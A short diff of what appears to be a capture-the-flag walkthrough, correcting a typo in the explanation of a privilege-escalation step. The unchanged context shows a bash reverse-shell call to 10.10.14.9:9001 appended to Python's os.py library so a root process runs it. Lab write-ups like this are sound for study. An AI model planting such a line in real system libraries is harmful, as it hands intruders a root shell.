@@ -57,7 +57,7 @@ friend@FriendZone:~$ tail -n 1 /usr/lib/python2.7/os.py
 system("bash -c 'bash -i >& /dev/tcp/10.10.14.9/9001 0>&1'")
 ```
 
-Ddd the system function call to the bottom of the page otherwise it won't work because `system` is defined in this library
+Add the system function call to the bottom of the page otherwise it won't work because `system` is defined somewhere in this library
 
 # Root shell
 ![](vx_images/4654216914797.png)
